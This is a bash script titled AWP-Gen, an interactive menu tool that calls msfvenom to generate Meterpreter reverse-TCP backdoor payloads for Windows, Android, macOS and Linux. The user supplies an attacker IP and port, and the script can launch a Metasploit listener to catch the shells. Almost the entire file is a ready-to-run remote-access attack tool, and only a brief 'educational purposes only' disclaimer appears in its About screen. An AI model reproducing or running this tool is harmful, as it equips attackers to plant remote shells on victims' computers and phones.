#!/bin/bash

#Color values
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
RESET='\033[0m'
LIGHT_CYAN='\033[1;36m'
LIGHT_GRAY='\033[0;37m'
DARK_GRAY='\033[1;30m'
LIGHT_RED='\033[1;31m'
LIGHT_GREEN='\033[1;32m'
LIGHT_BLUE='\033[1;34m'
LIGHT_PURPLE='\033[1;35m'

# Looping the terminal
while true
do

#clearing the screen everytime someones opens
clear

#Logo Function
function_logo () {
echo -e "                                 
                                                                                                                                                                
                                                                                                                                                                
               AAA   WWWWWWWW                           WWWWWWWWPPPPPPPPPPPPPPPPP                            GGGGGGGGGGGGG                                      
              A:::A  W::::::W                           W::::::WP::::::::::::::::P                        GGG::::::::::::G                                      
             A:::::A W::::::W                           W::::::WP::::::PPPPPP:::::P                     GG:::::::::::::::G                                      
            A:::::::AW::::::W                           W::::::WPP:::::P     P:::::P                   G:::::GGGGGGGG::::G                                      
           A:::::::::AW:::::W           WWWWW           W:::::W   P::::P     P:::::P                  G:::::G       GGGGGG    eeeeeeeeeeee    nnnn  nnnnnnnn    
          A:::::A:::::AW:::::W         W:::::W         W:::::W    P::::P     P:::::P                 G:::::G                ee::::::::::::ee  n:::nn::::::::nn  
         A:::::A A:::::AW:::::W       W:::::::W       W:::::W     P::::PPPPPP:::::P                  G:::::G               e::::::eeeee:::::een::::::::::::::nn 
        A:::::A   A:::::AW:::::W     W:::::::::W     W:::::W      P:::::::::::::PP   --------------- G:::::G    GGGGGGGGGGe::::::e     e:::::enn:::::::::::::::n
       A:::::A     A:::::AW:::::W   W:::::W:::::W   W:::::W       P::::PPPPPPPPP     -:::::::::::::- G:::::G    G::::::::Ge:::::::eeeee::::::e  n:::::nnnn:::::n
      A:::::AAAAAAAAA:::::AW:::::W W:::::W W:::::W W:::::W        P::::P             --------------- G:::::G    GGGGG::::Ge:::::::::::::::::e   n::::n    n::::n
     A:::::::::::::::::::::AW:::::W:::::W   W:::::W:::::W         P::::P                             G:::::G        G::::Ge::::::eeeeeeeeeee    n::::n    n::::n
    A:::::AAAAAAAAAAAAA:::::AW:::::::::W     W:::::::::W          P::::P                              G:::::G       G::::Ge:::::::e             n::::n    n::::n
   A:::::A             A:::::AW:::::::W       W:::::::W         PP::::::PP                             G:::::GGGGGGGG::::Ge::::::::e            n::::n    n::::n
  A:::::A               A:::::AW:::::W         W:::::W          P::::::::P                              GG:::::::::::::::G e::::::::eeeeeeee    n::::n    n::::n
 A:::::A                 A:::::AW:::W           W:::W           P::::::::P                                GGG::::::GGG:::G  ee:::::::::::::e    n::::n    n::::n
AAAAAAA                   AAAAAAAWWW             WWW            PPPPPPPPPP                                   GGGGGG   GGGG    eeeeeeeeeeeeee    nnnnnn    nnnnnn

      ||===================================================================================================================================================||
    ||                                                                                                                                                       ||
  ||                                                 Author : Anil Shrestha ( Cold_Bones )                                                                      ||
||                                                   Github : https://github.com/ColdBones69                                                                      ||
  ||                                                 Facebook : https://www.facebook.com/secrets.1928                                                           ||
    ||                                                                                                                                                        ||
      ||====================================================================================================================================================||                  
" | lolcat
}

# spinner function
function_spinner () {
spinner=('-' '\' '|' '/')
i=0
while true; do
  for i in "${spinner[@]}"; do
    echo -en "\r$i "
    sleep 0.1
  done
done
}

# Listner function
function_listner () {
echo -e "Starting the listener..." ; gnome-terminal --title="Metasploit Console" -x msfconsole 
}

#Calling the logo function
function_logo

#Payload Types
echo -e ${BLUE}"\n
[1] >>> Windows Payload

${CYAN}[2] >>> Android Payload

${GREEN}[3] >>> Mac Payload

${YELLOW}[4] >>> Linux Payload

${RED}[5] >>> Start Listner

${BLUE}[6] >>> About Us

${MAGENTA}[99] >>> Exit 
${RED}================================${WHITE}
"  
read -p "Cold_Bones [->>> " payload_type

# Windows Payload
if [ $payload_type == 1 ]
then
clear
#Calling logo function
function_logo
echo -e "\n
█░█░█ █ █▄░█ █▀▄ █▀█ █░█░█ █▀   █▀█ ▄▀█ █▄█ █░░ █▀█ ▄▀█ █▀▄
▀▄▀▄▀ █ █░▀█ █▄▀ █▄█ ▀▄▀▄▀ ▄█   █▀▀ █▀█ ░█░ █▄▄ █▄█ █▀█ █▄▀
===========================================================
" | lolcat 
echo -e ${LIGHT_RED}
read -p "Enter the IPadress >>> " lhost ; echo -e ${LIGHT_GREEN}
read -p "Enter the Port Number >>> " lport ; echo -e ${LIGHT_CYAN}
read -p "Enter the name for payload >>> " payload_name

# Generate the payload 
echo
echo -e ${WHITE} "Payload is being ready..." ; msfvenom --platform windows -p windows/meterpreter_reverse_tcp lhost=$lhost lport=$lport -f exe -o $payload_name.exe ; echo
echo -e ${LIGHT_PURPLE} "Payload saved in $PWD/$payload_name.exe" ; echo -e ${WHITE}

# Selecting listner after payload
while true
do
echo -e "Do you want to start the Listner ? ( Y/N )" 
read -p "Cold_Bones [->>> " listner
if [ $listner == Y ]
then
# calling listner function
function_listner ; echo ; read -p "Press enter to continuee..." 
elif [ $listner == N ]
then
break
else
echo -e ${RED} ; read -p "Please choose valid option..." ; echo -e ${WHITE}
fi 
done

# Anroid Payload
elif [ $payload_type == 2 ]
then
clear
#Calling logo function
function_logo
echo -e "\n
▄▀█ █▄░█ █▀▄ █▀█ █▀█ █ █▀▄   █▀█ ▄▀█ █▄█ █░░ █▀█ ▄▀█ █▀▄
█▀█ █░▀█ █▄▀ █▀▄ █▄█ █ █▄▀   █▀▀ █▀█ ░█░ █▄▄ █▄█ █▀█ █▄▀
=========================================================
" | lolcat 
echo -e ${LIGHT_RED}
read -p "Enter the IPadress >>> " lhost ; echo -e ${LIGHT_GREEN}
read -p "Enter the Port Number >>> " lport ; echo -e ${LIGHT_CYAN}
read -p "Enter the name for payload >>> " payload_name

# Generate the payload 
echo
echo -e ${WHITE} "Payload is being ready..." ; msfvenom -p android/meterpreter_reverse_tcp lhost=$lhost lport=$lport -o $payload_name.apk ; echo
echo -e ${LIGHT_PURPLE} "Payload saved in $PWD/$payload_name.apk" ; echo -e ${WHITE}

# Selecting listner after payload
while true
do
echo -e "Do you want to start the Listner ? ( Y/N )" 
read -p "Cold_Bones [->>> " listner

if [ $listner == Y ]
then
# calling listner function
function_listner ; echo ; read -p "Press enter to continuee..." 
elif [ $listner == N ]
then
break
else
echo -e ${RED} ; read -p "Please choose valid option..." ; echo -e ${WHITE}
fi 
done

# Mac Payload
elif [ $payload_type == 3 ]
then
clear
#Calling logo function
function_logo
echo -e "\n
█▀▄▀█ ▄▀█ █▀▀   █▀█ ▄▀█ █▄█ █░░ █▀█ ▄▀█ █▀▄
█░▀░█ █▀█ █▄▄   █▀▀ █▀█ ░█░ █▄▄ █▄█ █▀█ █▄▀
===========================================
" | lolcat 
echo -e ${LIGHT_RED}
read -p "Enter the IPadress >>> " lhost ; echo -e ${LIGHT_GREEN}
read -p "Enter the Port Number >>> " lport ; echo -e ${LIGHT_CYAN}
read -p "Enter the name for payload >>> " payload_name

# Generate the payload 
echo
echo -e ${WHITE} "Payload is being ready..." ; msfvenom -p osx/x64/meterpreter_reverse_tcp lhost=$lhost lport=$lport -f macho -o $payload_name.macho ; echo
echo -e ${LIGHT_PURPLE} "Payload saved in $PWD/$payload_name.macho" ; echo -e ${WHITE}

# Selecting listner after payload
while true
do
echo -e "Do you want to start the Listner ? ( Y/N )" 
read -p "Cold_Bones [->>> " listner

if [ $listner == Y ]
then
# calling listner function
function_listner ; echo ; read -p "Press enter to continuee..." 
elif [ $listner == N ]
then
break
else
echo -e ${RED} ; read -p "Please choose valid option..." ; echo -e ${WHITE}
fi 
done

# Linux Payload
elif [ $payload_type == 4 ]
then
clear
#Calling logo function
function_logo
echo -e "\n
█░░ █ █▄░█ █░█ ▀▄▀   █▀█ ▄▀█ █▄█ █░░ █▀█ ▄▀█ █▀▄
█▄▄ █ █░▀█ █▄█ █░█   █▀▀ █▀█ ░█░ █▄▄ █▄█ █▀█ █▄▀
================================================
" | lolcat 
echo -e ${LIGHT_RED}
read -p "Enter the IPadress >>> " lhost ; echo -e ${LIGHT_GREEN}
read -p "Enter the Port Number >>> " lport ; echo -e ${LIGHT_CYAN}
read -p "Enter the name for payload >>> " payload_name

# Generate the payload 
echo
echo -e ${WHITE} "Payload is being ready..." ; msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=$lhost lport=$lport -f elf -o $payload_name.elf ; echo
echo -e ${LIGHT_PURPLE} "Payload saved in $PWD/$payload_name.elf" ; echo -e ${WHITE}

# Selecting listner after payload
while true
do
echo -e "Do you want to start the Listner ? ( Y/N )" 
read -p "Cold_Bones [->>> " listner

if [ $listner == Y ]
then
# calling listner function
function_listner ; echo ; read -p "Press enter to continuee..." 
elif [ $listner == N ]
then
break
else
echo -e ${RED} ; read -p "Please choose valid option..." ; echo -e ${WHITE}
fi 
done

# Listner
elif [ $payload_type == 5 ]
then 
# calling listner function
function_listner ; echo ; read -p "Press enter to continuee..." 

elif [ $payload_type == 6 ]
then 
clear
#Calling logo function
function_logo
echo -e "
Author >>> Anil Shresthas
Github >>> https://github.com/ColdBones69
Facebook >>> https://www.facebook.com/secrets.1928

AWP-Gen is a tool to automate the creation of payload, This consists of different payloads for different platform.
This tool is made for educational purposes only so please don't misuse it... Thankyou for using..." | lolcat ; read

elif [ $payload_type == 99 ]
then
echo
str="Thank you for using our tool"

for ((i=0; i<${#str}; i++)); do
    echo -n "${str:$i:1}"
    sleep 0.1
done ; break ; read

#MAIN ELSE
else
echo -e ${RED} ; read -p "Please select valid option" 
#MAIN IF
fi
#MAIN LOOP
done
